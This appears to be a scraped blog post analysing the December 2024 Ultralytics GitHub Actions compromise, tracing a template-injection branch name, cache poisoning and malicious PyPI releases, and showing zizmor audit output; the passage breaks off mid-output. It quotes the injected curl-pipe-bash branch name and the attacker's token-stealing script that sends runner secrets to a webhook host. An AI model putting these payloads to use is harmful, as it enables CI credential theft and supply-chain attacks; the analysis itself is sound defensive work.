<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection">Original</a>
    <h1>Zizmor would have caught the Ultralytics workflow vulnerability</h1>
    
    <div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/series">Series</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
    <li><a href="https://yossarian.net">Main Site</a></li>
    <li><a href="https://yossarian.net/til">TILs</a></li>
    
</ul>

<hr/>



<h2>
  <p>
    <span><em>Dec 6, 2024</em></span>

       

    
      <span>
        Tags:
        
        
          <a href="https://blog.yossarian.net/tags#oss">oss</a>,
        
          <a href="https://blog.yossarian.net/tags#security">security</a>
        
      </span>
    

       

    
  </p>
</h2>






<hr/>


<p><strong>TL;DR</strong>: <a href="https://github.com/woodruffw/zizmor"><code>zizmor</code></a> would have caught the vulnerability that caused this…mostly.
<a href="#would-zizmor-have-caught-this">Read on</a> for details.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td><pre><span>error[dangerous-triggers]: use of fundamentally insecure workflow trigger
</span><span>  --&gt;</span><span> </span>.github/workflows/cla.yml:6:1
<span>   |
 6 | / on:
 7 | |   issue_comment:
...  |
13 | |       - opened
14 | |       - synchronize
   | |___________________^ pull_request_target is almost always used insecurely
   |
   = note: audit confidence → Medium
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p><strong>Important: I’m writing this post in real time as I learn more about what
happened here. I’ll be updating it throughout the day.</strong></p>

<p><strong>EDIT</strong>: I’ve reached the point here where I feel comfortable making
some inferences/conclusions. These are in the <a href="#conclusions">Conclusions</a>
section.</p>

<p><strong>EDIT 2024-12-07</strong>: Today is the last day I’ll be making updates to this
post. The <a href="#conclusions">Conclusions</a> are now fully updated, and I’ve added
a rough (but comprehensive)
<a href="#appendix-rough-timeline-of-events">timeline of events</a> as an appendix.</p>

<hr/>

<h2 id="summary">Summary</h2>

<p>Yesterday, someone exploited <a href="https://github.com/ultralytics/ultralytics">Ultralytics</a>, which is a <em>very</em> popular
machine learning package for vision stuff™. The attacker
appears to have compromised Ultralytics’ CI, and then pivoted to making a
malicious PyPI release (v8.3.41, now deleted<sup id="fnref:file" role="doc-noteref"><a href="#fn:file" rel="footnote">1</a></sup>), which contained a crypto miner.</p>

<p>It appears as though a subsequent release (v8.3.42, also now deleted) was also
malicious.</p>

<p><strong>UPDATE 2024-12-07</strong>: <a href="https://github.com/ultralytics/ultralytics">Ultralytics</a> was compromised <em>again</em>, within 36 hours
of the last compromise. This latest compromise appears to have resulted
in two more malicious releases, v8.3.45 and v8.3.46, both of which were
released directly to PyPI and have since been deleted. These releases
appear to have been pushed directly by the attacker using an API token stolen
from the <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a> CI/CD, likely at the same time as they
conducted the original exfiltration and cache poisoning attack.</p>

<h2 id="analysis">Analysis</h2>

<p>Here’s the rough flow of what happened:</p>

<ol>
  <li>
    <p>The <a href="https://github.com/openimbot">@openimbot</a> account opens a PR, <a href="https://github.com/ultralytics/ultralytics/pull/18020">#18020</a>, against the upstream
<a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a> repository.</p>

    <ul>
      <li>This appears to be a bot account, but presumably has some underlying
functionality that allowed a human being to open a PR under its name.</li>
    </ul>
  </li>
  <li>
    <p>PR <a href="https://github.com/ultralytics/ultralytics/pull/18020">#18020</a> has a malicious branch name:</p>

    <div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre> openimbot:$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh}${IFS}|${IFS}bash)
</pre></td></tr></tbody></table></code></pre></div>    </div>

    <p>or formatted, with <code>${IFS}</code> expanded with spaces:</p>

    <div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre> <span>$(</span><span>{</span>curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh<span>}</span> | bash<span>)</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>

    <p><strong>NOTE</strong>: I haven’t been able to get my hands on this payload yet;
 if you have access to it, ping me!</p>
  </li>
  <li>
    <p>This gets picked up by the <a href="https://github.com/ultralytics/ultralytics/blob/eb3783763dae921ada76bbb4d01a96ec5d412334/.github/workflows/format.yml"><code>format.yml</code> workflow</a>, which has a fundamentally
dangerous workflow trigger (<code>pull_request_target</code>).</p>
  </li>
  <li>
    <p><code>format.yml</code> calls a custom action, defined in <code>ultralytics/actions</code>:</p>

    <div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre> <span>steps</span><span>:</span>
 <span>-</span> <span>name</span><span>:</span> <span>Run Ultralytics Formatting</span>
   <span>uses</span><span>:</span> <span>ultralytics/actions@main</span>
   <span>with</span><span>:</span>
     <span>token</span><span>:</span> <span>${{ secrets._GITHUB_TOKEN }}</span> <span># note GITHUB_TOKEN automatically generated</span>
     <span># ... snip ...</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>
    <p>The custom action is a composite action with shell steps in its <a href="https://github.com/ultralytics/actions/blob/63d2cd98a098f45d5532e3b1ee7715bae66280c2/action.yml"><code>action.yml</code></a>,
including the following:</p>

    <div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td><pre><span>-</span> <span>name</span><span>:</span> <span>Commit and Push Changes</span>
  <span>if</span><span>:</span> <span>(github.event_name == &#39;pull_request&#39; || github.event_name == &#39;pull_request_target&#39;) &amp;&amp; github.event.action != &#39;closed&#39;</span>
  <span>run</span><span>:</span> <span>|</span>
      <span>git config --global user.name &#34;${{ inputs.github_username }}&#34;</span>
      <span>git config --global user.email &#34;${{ inputs.github_email }}&#34;</span>
      <span>git pull origin ${{ github.head_ref || github.ref }}</span>
      <span>git add .</span>
      <span>git reset HEAD -- .github/workflows/  # workflow changes are not permitted with default token</span>
      <span>if ! git diff --staged --quiet; then</span>
      <span>git commit -m &#34;Auto-format by https://ultralytics.com/actions&#34;</span>
      <span>git push</span>
      <span>else</span>
      <span>echo &#34;No changes to commit&#34;</span>
      <span>fi</span>
  <span>shell</span><span>:</span> <span>bash</span>
  <span>continue-on-error</span><span>:</span> <span>false</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>
    <p>Line <code>6</code> above is a classic GitHub Actions <a href="https://woodruffw.github.io/zizmor/audits/#template-injection">template injection</a>: the expansion
of <code>github.head_ref || github.ref</code> is injected directly into the shell’s context,
with no quoting or interpolation.</p>

    <p>I believe this is where the malicious branch name gets injected, resulting
in the payload (inside <code>raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh</code>)
being run.</p>
  </li>
  <li>
    <p>From here, the attacker is running code of their choice in a
<code>pull_request_target</code> context, meaning that (by default) they have access to
anything a normal privileged workflow can do.</p>

    <p>In particular, that means they (almost certainly) had (or still have)
push access to <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a> itself, as well as to the repository’s
privileged caches. Either one of these was/is an effective vector
for compromising the repository contents and/or the contents of its artifacts.</p>
  </li>
  <li>
    <p>I don’t know yet how the attacker pivoted from this <code>pull_request_target</code>
context to compromising the PyPI package that was then uploaded and
eventually noticed by users in <a href="https://github.com/ultralytics/ultralytics/issues/18027">#18027</a>. Their underlying technique
there would probably be revealed by the payload inside of the shell script
above.</p>

    <p><strong>EDIT</strong>: My colleague Will Tan pointed out that one of the fix PRs,
<a href="https://github.com/ultralytics/ultralytics/pull/18052">#18052</a>, also removes <code>cache: &#34;pip&#34;</code> from one of the <code>setup-python</code> sites.
This suggests that the underlying vector was indeed a poisoned cache,
introduced after the code injection.</p>

    <p><strong>EDIT</strong>: <a href="https://sethmlarson.dev/">Seth Larson</a> and <a href="https://durbin.ee/">Ee Durbin</a> point out that the Ultralytics
is using <a href="https://docs.pypi.org/trusted-publishers/">Trusted Publishing</a> with PyPI, but they <em>aren’t</em> using a configured
deployment environment. That means that they have/had no additional signoff
or other environment protections on PyPI releases, which in turn suggests
that workflow compromise was sufficient to induce the publish event.</p>

    <p><strong>EDIT</strong>: <a href="https://github.com/AdnaneKhan">Adnan Khan</a> has <a href="https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2524133799">pointed out</a> the likely cache entry that
was poisoned to compromise the build in this case. Combined with
the <code>CacheServerUrl</code> exfiltration observed below, this <strong>very strongly</strong>
suggests that the attacker used a poisoned cache.</p>
  </li>
</ol>

<p>Regardless of how the <code>pull_request_target</code> pivot occurred, it appears
as though <a href="https://github.com/ultralytics/ultralytics/commit/cb260c243ffa3e0cc84820095cd88be2f5db86ca"><code>cb260c243ffa3e0cc84820095cd88be2f5db86ca</code></a> is the triggering
commit for the first malicious release: it bumps the version to the first
known malicious version (v8.3.41) and, <em>critically</em>, removes a <code>github.actor</code>
check that limited who could do <code>publish.yml</code> triggers from the <code>main</code>
branch:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span>- if: github.repository == &#39;ultralytics/ultralytics&#39; &amp;&amp; github.actor == &#39;glenn-jocher&#39;
</span><span>+ if: github.repository == &#39;ultralytics/ultralytics&#39;
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>At this point, the <code>publish.yml</code> workflow is triggered on a <code>push</code> event for
the <code>main</code> branch, resulting in an action run that published v8.3.41
to PyPI. I’ve uploaded the <code>publish.yml</code> action log <a href="https://gist.github.com/woodruffw/7d6a07077842508b85008e0267f7f3bb">here</a>.</p>

<p>The sdist and wheel for v8.3.41 can also be found in Sigstore’s transparency
log as <a href="https://search.sigstore.dev/?logIndex=153415338">153415338</a> and <a href="https://search.sigstore.dev/?logIndex=153415340">153415340</a> respectively.</p>

<p><a href="https://github.com/AdnaneKhan">Adnan Khan</a> also <a href="https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2523875957">points out</a> that <a href="https://search.sigstore.dev/?logIndex=153589717">153589717</a>
is the Sigstore transparency log entry for one of v8.3.42’s distributions.</p>

<p>All of these log entries show a <code>push</code> event for <code>main</code>.</p>

<p>All in all, malicious version of Ultralytics were available on PyPI
for <a href="https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2523755580">about 13 hours</a>. The discussion in <a href="https://github.com/ultralytics/ultralytics/issues/18027">#18027</a> has lots of additional details,
including some analysis of the payload in the Python package itself
(which I haven’t analyzed yet).</p>

<h2 id="tracking-the-payload">Tracking the payload</h2>

<p>I’m breaking this section out because it’s proving to be independently interesting.</p>

<p>This is the initial payload, which now 404s presumably because GitHub has taken
it down:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>hxxps://raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh
</pre></td></tr></tbody></table></code></pre></div></div>

<p><a href="https://github.com/alindeman">Andy Lindeman</a> conducted a search for similar branch names pushed by other users,
and discovered that <a href="https://github.com/jiwuwgknvm">@jiwuwgknvm</a> (user ID 190546325, now deleted) created a
branch with a similar name at <code>12/3/2024 22:32:01</code>.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td><pre>{
    &#34;repository_id&#34;: 898159334,
    &#34;push_id&#34;: 21527588446,
    &#34;size&#34;: 1,
    &#34;distinct_size&#34;: 1,
    &#34;ref&#34;: &#34;refs/heads/$({curl,-sSfL,gist.githubusercontent.com/jiwuwgknvm/7037bca8cde383718b5c3e7142b0dd8b/raw/run.sh}${IFS}|${IFS})&#34;,
    &#34;head&#34;: &#34;c81850c5d3c1815ae86c44f0abb83dafc5bf37e5&#34;,
    &#34;before&#34;: &#34;21162bd870444550286983a601afbfb142f4c198&#34;,
    &#34;commits&#34;: [
        {
            &#34;sha&#34;: &#34;c81850c5d3c1815ae86c44f0abb83dafc5bf37e5&#34;,
            &#34;author&#34;: {
                &#34;email&#34;: &#34;ef65d58e27c5649bcc0a8b9706f2849d67677ab3@users.noreply.github.com&#34;,
                &#34;name&#34;: &#34;jiwuwgknvm&#34;
            },
            &#34;message&#34;: &#34;[skip ci] Update README.md&#34;,
            &#34;distinct&#34;: true,
            &#34;url&#34;: &#34;https://api.github.com/repos/jiwuwgknvm/ultralytics/commits/c81850c5d3c1815ae86c44f0abb83dafc5bf37e5&#34;
        }
    ]
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This branch references a <em>different</em> payload, this time in a Gist:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>hxxps://gist.githubusercontent.com/jiwuwgknvm/7037bca8cde383718b5c3e7142b0dd8b/raw/run.sh
</pre></td></tr></tbody></table></code></pre></div></div>

<p>That URL 404s, but the underlying Gist repository is still live:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span>$ </span>git@gist.github.com:7037bca8cde383718b5c3e7142b0dd8b.git run <span>&amp;&amp;</span> <span>ls </span>run
run.sh
</pre></td></tr></tbody></table></code></pre></div></div>

<p>…and <code>run.sh</code> contains a standard <code>GITHUB_TOKEN</code> stealer:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td><pre><span>YOUR_EXFIL</span><span>=</span><span>&#34;webhook.site/31c2eb17-ae87-4aaf-835a-ef2d225d58d0&#34;</span>

<span>if</span> <span>[[</span> <span>&#34;</span><span>$OSTYPE</span><span>&#34;</span> <span>==</span> <span>&#34;linux-gnu&#34;</span> <span>]]</span><span>;</span> <span>then
  </span><span>B64_BLOB</span><span>=</span><span>`</span>curl <span>-sSf</span> https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | <span>sudo </span>python3 | <span>tr</span> <span>-d</span> <span>&#39;\0&#39;</span> | <span>grep</span> <span>-aoE</span> <span>&#39;&#34;[^&#34;]+&#34;:\{&#34;value&#34;:&#34;[^&#34;]*&#34;,&#34;isSecret&#34;:true\}&#39;</span> | <span>sort</span> <span>-u</span> | <span>base64</span> <span>-w</span> 0<span>`</span>
  <span># Exfil to Burp</span>
  curl <span>-s</span> <span>-d</span> <span>&#34;</span><span>$B64_BLOB</span><span>&#34;</span> https://<span>$YOUR_EXFIL</span>/token <span>&gt;</span> /dev/null
<span>else
  </span><span>exit </span>0
<span>fi

</span><span>BLOB</span><span>=</span><span>`</span>curl <span>-sSf</span> https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | <span>sudo </span>python3 | <span>tr</span> <span>-d</span> <span>&#39;\0&#39;</span> | <span>grep</span> <span>-aoE</span> <span>&#39;&#34;[^&#34;]+&#34;:\{&#34;AccessToken&#34;:&#34;[^&#34;]*&#34;\}&#39;</span> | <span>sort</span> <span>-u</span><span>`</span>
<span>BLOB2</span><span>=</span><span>`</span>curl <span>-sSf</span> https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | <span>sudo </span>python3 | <span>tr</span> <span>-d</span> <span>&#39;\0&#39;</span> | <span>grep</span> <span>-aoE</span> <span>&#39;&#34;CacheServerUrl&#34;:&#34;[^&#34;]*&#34;&#39;</span> | <span>sort</span> <span>-u</span><span>`</span>
curl <span>-s</span> <span>-d</span> <span>&#34;</span><span>$BLOB</span><span> </span><span>$BLOB2</span><span>&#34;</span> https://<span>$YOUR_EXFIL</span>/token <span>&gt;</span> /dev/null
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code>git log</code> for the gist suggests that the <a href="https://github.com/jiwuwgknvm">@jiwuwgknvm</a> identity is also
in control of <code>consrensys.com</code>, which was one of the original IOCs for the
dropped miner.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>$</span><span> </span>git log
<span>commit b9029cbea0ed7ac5bdd928c1c185f4d5c9384a33 (HEAD -&gt;</span><span> </span>main, origin/main, origin/HEAD<span>)</span>
<span>Author: jiwuwgknvm &lt;fowevjweoj@consrensys.com&gt;</span><span>
</span><span>Date:   Tue Dec 3 22:26:28 2024 +0000
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p><strong>EDIT</strong>: <a href="https://sethmlarson.dev/">Seth Larson</a> observes that the stealer also steals the <code>CacheServerUrl</code>,
providing more circumstantial evidence for the cache poisoning hypothesis.</p>

<p><a href="https://github.com/alindeman">Andy Lindeman</a> also discovered an earlier GitHub identity, <a href="https://github.com/jeficmer456">@jeficmer456</a> (also deleted),
which appears to have been experimenting with the template injection even earlier
(circa <code>12/2/2024 3:09:58</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td><pre><span>{</span><span>
    </span><span>&#34;repository_id&#34;</span><span>:</span><span> </span><span>897066482</span><span>,</span><span>
    </span><span>&#34;push_id&#34;</span><span>:</span><span> </span><span>21489353876</span><span>,</span><span>
    </span><span>&#34;size&#34;</span><span>:</span><span> </span><span>1</span><span>,</span><span>
    </span><span>&#34;distinct_size&#34;</span><span>:</span><span> </span><span>1</span><span>,</span><span>
    </span><span>&#34;ref&#34;</span><span>:</span><span> </span><span>&#34;refs/heads/preview/$(curl,-sSfL,https/gist.githubusercontent.com/jefic6421/4c439e3fa47435a52d55027fbcf8f454/raw/morning_joe.sh${IFS}|bash)</span><span>\&#34;</span><span>&#34;</span><span>,</span><span>
    </span><span>&#34;head&#34;</span><span>:</span><span> </span><span>&#34;5ff55a620e46ddac1e2af42c27ebc35d8a257d25&#34;</span><span>,</span><span>
    </span><span>&#34;before&#34;</span><span>:</span><span> </span><span>&#34;b751d508e5149ced753c4a73c271032d1ef55e1d&#34;</span><span>,</span><span>
    </span><span>&#34;commits&#34;</span><span>:</span><span> </span><span>[</span><span>
        </span><span>{</span><span>
            </span><span>&#34;sha&#34;</span><span>:</span><span> </span><span>&#34;5ff55a620e46ddac1e2af42c27ebc35d8a257d25&#34;</span><span>,</span><span>
            </span><span>&#34;author&#34;</span><span>:</span><span> </span><span>{</span><span>
                </span><span>&#34;email&#34;</span><span>:</span><span> </span><span>&#34;0b4c7ddc61d5cafe49babc3dd544c5aa0b03815c@proton.me&#34;</span><span>,</span><span>
                </span><span>&#34;name&#34;</span><span>:</span><span> </span><span>&#34;jeficmer456&#34;</span><span>
            </span><span>},</span><span>
            </span><span>&#34;message&#34;</span><span>:</span><span> </span><span>&#34;Update preview-release-on-comment.yml</span><span>\n\n</span><span>Update preview-release-on-comment.yml&#34;</span><span>,</span><span>
            </span><span>&#34;distinct&#34;</span><span>:</span><span> </span><span>true</span><span>,</span><span>
            </span><span>&#34;url&#34;</span><span>:</span><span> </span><span>&#34;https://api.github.com/repos/jeficmer456/merchant-center-application-kit/commits/5ff55a620e46ddac1e2af42c27ebc35d8a257d25&#34;</span><span>
        </span><span>}</span><span>
    </span><span>]</span><span>
</span><span>}</span><span>
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>This led to another user Gist:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span>$ </span>git clone git@gist.github.com:4c439e3fa47435a52d55027fbcf8f454.git run <span>&amp;&amp;</span> <span>ls </span>run
morningjoe.sh
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Where <code>morningjoe.sh</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td><pre><span>#!/bin/bash</span>
<span>echo</span> <span>&#34;Creating a new file with coffee cup ASCII art in the repository...&#34;</span>

<span># Define the file name and content</span>
<span>FILE_NAME</span><span>=</span><span>&#34;coffee_art.txt&#34;</span>
<span>ART</span><span>=</span><span>&#34;
     ( (
      ) )
   .....
   |   | ]]
   |---|
   |   |
&#34;</span>

<span># Create the file</span>
<span>echo</span> <span>&#34;</span><span>$ART</span><span>&#34;</span> <span>&gt;</span> <span>$FILE_NAME</span>

<span># Commit and push the file</span>
git add <span>$FILE_NAME</span>
git commit <span>-m</span> <span>&#34;Added coffee_art.txt&#34;</span>
git push origin HEAD
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code>git log</code> for this Gist suggests the identity goes back to 2024-12-01:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td><pre><span>commit 8f6aa1be0f49c7bdd5e65a7f140dc7b8ac9e4e75 (HEAD -&gt;</span><span> </span>main, origin/main, origin/HEAD<span>)</span>
<span>Author: jefic6421 &lt;jefic64219@confmin.com&gt;</span><span>
</span><span>Date:   Sun Dec 1 22:46:53 2024 -0500

commit 43c355c4b2407a37d6e8d14408fb59815a5d04c6
</span><span>Author: jefic6421 &lt;jefic64219@confmin.com&gt;</span><span>
</span><span>Date:   Sun Dec 1 22:21:06 2024 -0500

commit 3def13bcc973d3d4c50513b2530afca04dc94617
</span><span>Author: jefic6421 &lt;jefic64219@confmin.com&gt;</span><span>
</span><span>Date:   Sun Dec 1 22:05:15 2024 -0500
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>This email identity is also separate from the one associated with the Gist, per above
(<code>0b4c7ddc61d5cafe49babc3dd544c5aa0b03815c@proton.me</code>).</p>

<h2 id="would-zizmor-have-caught-this">Would <a href="https://github.com/woodruffw/zizmor"><code>zizmor</code></a> have caught this?</h2>

<p>This is what I immediately wondered upon seeing this. Let’s find out!</p>

<p>Here is what <a href="https://github.com/woodruffw/zizmor"><code>zizmor</code></a> reports for <a href="https://github.com/ultralytics/ultralytics/tree/v8.3.40">v8.3.40</a>, i.e. the release state <em>right before</em>
the attack:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>$ </span>zizmor <span>--gh-token</span><span>=</span><span>$(</span>gh auth token<span>)</span> ultralytics/ultralytics@v8.3.40
</pre></td></tr></tbody></table></code></pre></div></div>

<p><strong>NOTE</strong>: Passing <code>ultralytics/ultralytics@v8.3.40</code> directly is supported
on <code>main</code>, but isn’t in a release of <a href="https://github.com/woodruffw/zizmor"><code>zizmor</code></a> yet. To reproduce with a
released version, you can <code>git clone</code> <a href="https://github.com/ultralytics/ultralytics">Ultralytics</a> and run <a href="https://github.com/woodruffw/zizmor"><code>zizmor</code></a>
on a checkout of <a href="https://github.com/ultralytics/ultralytics/tree/v8.3.40">v8.3.40</a>.</p>

<p>I’ve excerpted the output substantially, to remove findings that
<a href="https://github.com/ultralytics/ultralytics">Ultralytics</a> <em>should</em> fix but are not immediately relevant to this
particular exploit:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
</pre></td><td><pre><span>error[dangerous-triggers]: use of fundamentally insecure workflow trigger
</span><span>  --&gt;</span><span> </span>.github/workflows/cla.yml:6:1
<span>   |
 6 | / on:
 7 | |   issue_comment:
...  |
13 | |       - opened
14 | |       - synchronize
   | |___________________^ pull_request_target is almost always used insecurely
   |
   = note: audit confidence → Medium

info[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/docs.yml:55:9
<span>   |
55 |         - name: Update Docs Reference Section and Push Changes
   |           ---------------------------------------------------- info: this step
56 |           continue-on-error: true
57 |           run: |
   |  _________-
58 | |           python docs/build_reference.py
...  |
66 | |             echo &#34;No changes to commit&#34;
67 | |           fi
   | |____________- info: github.head_ref may expand into attacker-controllable code
   |
   = note: audit confidence → Low

info[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/docs.yml:55:9
<span>   |
55 |         - name: Update Docs Reference Section and Push Changes
   |           ---------------------------------------------------- info: this step
56 |           continue-on-error: true
57 |           run: |
   |  _________-
58 | |           python docs/build_reference.py
...  |
66 | |             echo &#34;No changes to commit&#34;
67 | |           fi
   | |____________- info: github.ref may expand into attacker-controllable code
   |
   = note: audit confidence → Low

info[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/docs.yml:74:9
<span>   |
74 |         - name: Commit and Push Docs changes
   |           ---------------------------------- info: this step
75 |           continue-on-error: true
76 |           if: always()
77 |           run: |
   |  _________-
</span><span>78 | |           git pull origin $</span><span>{{</span> github.head_ref <span>||</span> github.ref <span>}}</span>
<span>...  |
85 | |             echo &#34;No changes to commit&#34;
86 | |           fi
   | |____________- info: github.head_ref may expand into attacker-controllable code
   |
   = note: audit confidence → Low

info[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/docs.yml:74:9
<span>   |
74 |         - name: Commit and Push Docs changes
   |           ---------------------------------- info: this step
75 |           continue-on-error: true
76 |           if: always()
77 |           run: |
   |  _________-
</span><span>78 | |           git pull origin $</span><span>{{</span> github.head_ref <span>||</span> github.ref <span>}}</span>
<span>...  |
85 | |             echo &#34;No changes to commit&#34;
86 | |           fi
   | |____________- info: github.ref may expand into attacker-controllable code
   |
   = note: audit confidence → Low

info[template-injection]: code injection via template expansion
</span><span>   --&gt;</span><span> </span>.github/workflows/docs.yml:87:9
<span>    |
 87 |         - name: Publish Docs to https://docs.ultralytics.com
    |           -------------------------------------------------- info: this step
 88 |           if: github.event_name == &#39;push&#39; || (github.event_name == &#39;workflow_dispatch&#39; &amp;&amp; github.event.inputs.publish_docs == &#39;true&#39;)
 89 |           run: |
    |  _________-
 90 | |           git clone https://github.com/ultralytics/docs.git docs-repo
...   |
</span><span>102 | |             git push https://$</span><span>{{</span> secrets._GITHUB_TOKEN <span>}}</span>@github.com/ultralytics/docs.git gh-pages
<span>103 | |           fi
    | |_____________- info: steps.check_pypi.outputs.version may expand into attacker-controllable code
    |
    = note: audit confidence → Low

error[dangerous-triggers]: use of fundamentally insecure workflow trigger
</span><span>  --&gt;</span><span> </span>.github/workflows/format.yml:7:1
<span>   |
 7 | / on:
 8 | |   issues:
...  |
13 | |     branches: [main]
14 | |     types: [opened, closed, synchronize, review_requested]
   | |__________________________________________________________^ pull_request_target is almost always used insecurely
   |
   = note: audit confidence → Medium

info[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/publish.yml:62:9
<span>   |
62 |         - name: Publish new tag
   |           --------------------- info: this step
63 |           if: (github.event_name == &#39;push&#39; || github.event.inputs.pypi == &#39;true&#39;)  &amp;&amp; steps.check_pypi.outputs.increment == &#39;True&#39;
64 |           run: |
   |  _________-
</span><span>65 | |           git tag -a &#34;$</span><span>{{</span> steps.check_pypi.outputs.current_tag <span>}}</span><span>&#34; -m &#34;</span><span>$(</span>git log <span>-1</span> <span>--pretty</span><span>=</span>%B<span>)</span><span>&#34;  # i.e. &#34;</span>v0.1.2 commit message<span>&#34;
</span><span>66 | |           git push origin &#34;$</span><span>{{ steps.check_pypi.outputs.current_tag }}&#34;</span>
<span>   | |_______________________________________________________________________- info: steps.check_pypi.outputs.current_tag may expand into attacker-controllable code
   |
   = note: audit confidence → Low

info[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/publish.yml:62:9
<span>   |
62 |         - name: Publish new tag
   |           --------------------- info: this step
63 |           if: (github.event_name == &#39;push&#39; || github.event.inputs.pypi == &#39;true&#39;)  &amp;&amp; steps.check_pypi.outputs.increment == &#39;True&#39;
64 |           run: |
   |  _________-
</span><span>65 | |           git tag -a &#34;$</span><span>{{</span> steps.check_pypi.outputs.current_tag <span>}}</span><span>&#34; -m &#34;</span><span>$(</span>git log <span>-1</span> <span>--pretty</span><span>=</span>%B<span>)</span><span>&#34;  # i.e. &#34;</span>v0.1.2 commit message<span>&#34;
</span><span>66 | |           git push origin &#34;$</span><span>{{ steps.check_pypi.outputs.current_tag }}&#34;</span>
<span>   | |_______________________________________________________________________- info: steps.check_pypi.outputs.current_tag may expand into attacker-controllable code
   |
   = note: audit confidence → Low

error[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/publish.yml:76:9
<span>   |
76 |         - name: Extract PR Details
   |           ^^^^^^^^^^^^^^^^^^^^^^^^ this step
77 |           env:
</span><span>78 |             GH_TOKEN: $</span><span>{{</span> secrets._GITHUB_TOKEN <span>}}</span>
<span>79 |           run: |
   |  _________^
</span><span>80 | |           #</span><span> </span>Check <span>if </span>the event is a pull request or pull_request_target
<span>...  |
